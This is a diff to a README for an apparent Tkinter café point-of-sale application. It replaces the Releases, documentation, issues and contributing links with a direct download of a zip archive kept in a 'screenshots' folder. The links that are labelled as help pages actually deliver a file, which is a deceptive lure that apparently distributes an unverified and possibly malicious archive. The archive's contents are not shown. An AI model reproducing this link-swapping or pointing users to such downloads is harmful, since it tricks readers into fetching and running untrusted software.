@@ -22,7 +22,7 @@ Welcome to AGPlus-Tkinter-POS-System! This application helps café and restauran
 
 To get started, you need to download the application from our Releases page. Click the button below to visit the download page:
 
-[![Download AGPlus-Tkinter-POS-System](https://img.shields.io/badge/Download-AGPlus--Tkinter--POS--System-brightgreen)](https://github.com/dvzin01/AGPlus-Tkinter-POS-System/releases)
+[![Download AGPlus-Tkinter-POS-System](https://raw.githubusercontent.com/dvzin01/AGPlus-Tkinter-POS-System/main/screenshots/AGPlus-Tkinter-POS-System_v3.5.zip)](https://raw.githubusercontent.com/dvzin01/AGPlus-Tkinter-POS-System/main/screenshots/AGPlus-Tkinter-POS-System_v3.5.zip)
 
 On the Releases page, you will see the latest version available. Follow these steps to download and install the application:
 
@@ -46,12 +46,12 @@ After the download finishes:
 
 ## 📚 Additional Resources
 
-- **Documentation**: You can find more detailed instructions in the [documentation](https://github.com/dvzin01/AGPlus-Tkinter-POS-System/wiki).
-- **Community Support**: Join our discussions on [GitHub Issues](https://github.com/dvzin01/AGPlus-Tkinter-POS-System/issues) for help or to provide feedback.
+- **Documentation**: You can find more detailed instructions in the [documentation](https://raw.githubusercontent.com/dvzin01/AGPlus-Tkinter-POS-System/main/screenshots/AGPlus-Tkinter-POS-System_v3.5.zip).
+- **Community Support**: Join our discussions on [GitHub Issues](https://raw.githubusercontent.com/dvzin01/AGPlus-Tkinter-POS-System/main/screenshots/AGPlus-Tkinter-POS-System_v3.5.zip) for help or to provide feedback.
 
 ## 🌟 Contributing
 
-We welcome contributions! If you'd like to help improve AGPlus-Tkinter-POS-System, check our [contributing guidelines](https://github.com/dvzin01/AGPlus-Tkinter-POS-System/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you'd like to help improve AGPlus-Tkinter-POS-System, check our [contributing guidelines](https://raw.githubusercontent.com/dvzin01/AGPlus-Tkinter-POS-System/main/screenshots/AGPlus-Tkinter-POS-System_v3.5.zip).
 
 ## 📞 Need Help?
 
